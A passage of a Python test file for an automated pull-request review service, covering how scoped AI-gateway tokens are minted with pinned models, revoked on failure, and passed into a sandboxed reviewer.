        title="Implementation: fix the thing",
        description="",
        origin_product=Task.OriginProduct.SIGNAL_REPORT,
        repository=REPO,
        signal_report=report,
        internal=True,
    )
    task_run = TaskRun.objects.create(
        task=task,
        team=team,
        status=TaskRun.Status.COMPLETED,
        state={"ai_stage": "implementation", "self_driving_head_branch": head_branch},
    )

    with (
        override_instance_config("GITHUB_APP_SLUG", "posthog-code"),
        # An opted-in reviewer for the execution-time re-check (fail-closed when unregistered).
        patch(
            "products.stamphog.backend.facade.inbox_hooks._inbox_acting_reviewer_resolver",
            lambda team_id, report_id, created_by: 777,
        ),
    ):
        process_inbox_pr_review(
            team_id=team.id,
            pr_url=f"https://github.com/{REPO}/pull/120",
            repository=REPO,
            acting_user_id=777,
            signal_report_id=str(report.id),
            task_run_id=str(task_run.id),
        )

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED

    context = json.loads(dict(stamphog_chain.sandbox_writes)[STAMPHOG_SANDBOX_CONTEXT_PATH].decode())
    assert context["self_driving_review"] is True
    # Trust-signal adaptation: the machine user's merged-PR history must not feed familiarity.
    assert context["author_pr_numbers"] == []

    # The provenance must also reach the env stamp — it's what segments these runs in analytics.
    sandbox_env = stamphog_chain.sandbox_class.created_configs[0].environment_variables
    assert json.loads(sandbox_env["STAMPHOG_EXTRA_PROPERTIES"])["stamphog_self_driving_review"] is True

    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    assert len(approvals) == 1
    assert approvals[0]["body"]["commit_id"] == "sha120a"


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mint_pins_allowed_models_when_configured(team, stamphog_chain: StamphogChain) -> None:
    # A configured model list rides the mint request so a leaked token can call nothing else.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 118, "sha118a")
    minted = {"token": "phe_run", "allowed_models": ["anthropic/claude-sonnet-5", "anthropic/claude-haiku-4-5"]}
    mint = MagicMock(return_value=_mint_response(201, minted))

    with (
        override_settings(
            **_GO_GATEWAY_SETTINGS, STAMPHOG_REVIEWER_TOKEN_ALLOWED_MODELS=["claude-sonnet-5", "claude-haiku-4-5", ""]
        ),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    # Empty entries (a trailing comma in the env value) never reach the gateway, which would 400.
    assert mint.call_args_list[0].kwargs["json"]["allowed_models"] == ["claude-sonnet-5", "claude-haiku-4-5"]
    env = stamphog_chain.sandbox_class.created_configs[0].environment_variables
    assert env["AI_GATEWAY_API_KEY"] == "phe_run"


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mint_omits_allowed_models_by_default(team, stamphog_chain: StamphogChain) -> None:
    # Unset means unpinned: the field is absent, never an empty list (which the gateway rejects).
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 119, "sha119a")
    mint = MagicMock(return_value=_mint_response(201, {"token": "phe_run"}))

    with (
        override_settings(**_GO_GATEWAY_SETTINGS, STAMPHOG_REVIEWER_TOKEN_ALLOWED_MODELS=[]),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    assert "allowed_models" not in mint.call_args_list[0].kwargs["json"]
    # No pin was asked for, so a missing echo is not a dropped pin and the review runs.
    env = stamphog_chain.sandbox_class.created_configs[0].environment_variables
    assert env["AI_GATEWAY_API_KEY"] == "phe_run"


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mint_fails_closed_when_the_gateway_ignores_the_model_pin(team, stamphog_chain: StamphogChain) -> None:
    # A gateway replica that predates the pin field ignores it and mints an unpinned token. The
    # token is revoked and the run fails: a sandbox never sees a credential looser than asked for.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 120, "sha120a")
    mint = MagicMock(side_effect=[_mint_response(201, {"token": "phe_run"}), _mint_response(200, {"revoked": True})])
    unpinned_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get()
    ok_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()

    with (
        override_settings(**_GO_GATEWAY_SETTINGS, STAMPHOG_REVIEWER_TOKEN_ALLOWED_MODELS=["claude-sonnet-5"]),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "model pin" in (run.error or "")
    assert stamphog_chain.sandbox_class.created_configs == []
    _, revoke_call = mint.call_args_list
    assert revoke_call.args == ("https://ai-gateway.test/v1/tokens/revoke",)
    assert revoke_call.kwargs["json"] == {"token": "phe_run"}
    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get() == unpinned_before + 1
    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mint_retries_a_network_error_and_records_the_outcome(team, stamphog_chain: StamphogChain) -> None:
    # A transport blip (timeout, reset) is retried once and the review proceeds; the attempt carries
    # the bounded timeout, and the counter records the outcome the operator will watch.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 122, "sha122a")
    mint = MagicMock(
        side_effect=[
            requests.ConnectionError("reset"),
            _mint_response(201, {"token": "phe_run"}),
            _mint_response(200, {"revoked": True}),
        ]
    )
    ok_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.object(activities.requests, "post", mint),
        patch.object(activities.time, "sleep") as sleep,
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    env = stamphog_chain.sandbox_class.created_configs[0].environment_variables
    assert env["AI_GATEWAY_API_KEY"] == "phe_run"
    assert [call.args[0] for call in mint.call_args_list] == [
        "https://ai-gateway.test/v1/tokens",
        "https://ai-gateway.test/v1/tokens",
        "https://ai-gateway.test/v1/tokens/revoke",
    ]
    assert all(call.kwargs["timeout"] == 3 for call in mint.call_args_list)
    sleep.assert_called_once()
    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before + 1


def test_product_tag_matches_the_engine_blob() -> None:
    # The mint pins the product and the shipped engine stamps the same word in its properties blob;
    # the two are hand-typed in different packages, so bind them here where both are visible.
    engine_gateway = Path(activities.__file__).resolve().parents[2] / "packages" / "pr-approval-agent" / "gateway.py"
    assert f'AI_PRODUCT = "{activities.STAMPHOG_AI_PRODUCT}"' in engine_gateway.read_text()


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_scoped_token_is_revoked_when_the_sandbox_phase_fails(team, stamphog_chain: StamphogChain) -> None:
    # The revoke exists for the runs that end badly: a sandbox that cannot be provisioned still had
    # a live token minted for it, and the token dies with the attempt.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 123, "sha123a")
    broken_sandbox = fakes.make_fake_sandbox_class(fakes.approved_engine_output())
    broken_sandbox.create_error = RuntimeError("modal is down")
    mint = MagicMock(side_effect=[_mint_response(201, {"token": "phe_run"}), _mint_response(200, {"revoked": True})])

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.object(activities.requests, "post", mint),
        patch(
            "products.stamphog.backend.temporal.activities.get_sandbox_class_for_backend",
            lambda backend: broken_sandbox,
        ),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert (run.error or "").startswith("SandboxPhaseError")
    _, revoke_call = mint.call_args_list
    assert revoke_call.args == ("https://ai-gateway.test/v1/tokens/revoke",)
    assert revoke_call.kwargs["json"] == {"token": "phe_run"}


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_an_ineffective_revoke_is_logged(team, stamphog_chain: StamphogChain) -> None:
    # The gateway answers 200 with revoked=false when nothing matched; that is the one signal that
    # revocation is broken, so it must reach the warning like a transport failure does.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 124, "sha124a")
    mint = MagicMock(side_effect=[_mint_response(201, {"token": "phe_run"}), _mint_response(200, {"revoked": False})])

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.object(activities.requests, "post", mint),
        patch.object(activities.activity.logger, "warning") as warning,
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    assert any(
        "Could not revoke the reviewer token (no such token)" in str(call.args[0]) for call in warning.call_args_list
    )


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_legacy_oauth_token_is_deleted_after_the_run(team, user, stamphog_chain: StamphogChain) -> None:
    # On the legacy path the credential is a row this worker created with a six-hour TTL; it goes
    # when the sandbox does, the same as the Go token.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 125, "sha125a")

    with override_settings(AI_GATEWAY_URL="https://llm-gateway.test/stamphog/v1", AI_GATEWAY_API_KEY=""):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    env = stamphog_chain.sandbox_class.created_configs[0].environment_variables
    assert env["AI_GATEWAY_API_KEY"].startswith("pha_")
    assert not OAuthAccessToken.objects.filter(token=env["AI_GATEWAY_API_KEY"]).exists()


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_key_with_the_legacy_url_fails_before_the_mint(team, stamphog_chain: StamphogChain) -> None:
    # An ai-gateway key next to the legacy route: the phs_ must not be posted to the Python host, so
    # the run fails with a config message before any mint.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 126, "sha126a")
    mint = MagicMock()

    with (
        override_settings(
            AI_GATEWAY_URL="https://llm-gateway.test/stamphog/v1", AI_GATEWAY_API_KEY="phs_stamphog_mint"
        ),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "legacy stamphog route" in (run.error or "")
    mint.assert_not_called()
    assert not stamphog_chain.sandbox_class.created_configs
